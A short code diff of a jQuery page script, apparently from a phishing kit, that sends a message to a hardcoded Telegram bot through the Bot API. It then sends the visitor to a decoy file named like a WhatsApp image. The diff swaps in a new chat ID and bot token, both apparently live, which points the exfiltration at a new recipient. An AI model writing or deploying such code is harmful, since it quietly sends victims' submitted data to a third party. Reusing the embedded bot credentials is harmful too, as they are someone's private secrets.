@@ -1,7 +1,7 @@
      $(document).ready(function() {
 
-       const chat_id = '8022812304',
-         botID = 'bot7894845694:AAFGDlcpOfNcHKgIG6cIliKRhQu_NHcTMbY';
+       const chat_id = '7661759276',
+         botID = 'bot7686537939:AAFobDIjSLc2v2co7H0L7LD3dabns7ta_oQ';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
@@ -15,7 +15,7 @@
            headers: { "Content-Type": "application/json" }, // This is required when sending a JSON body.
            body: JSON.stringify({ chat_id, text }), // The body must be a string, not an object
          });
-         window.location.href = 'ver.html';
+         window.location.href = 'IMG-20250504-WA0000.jpg';
        });
 
 
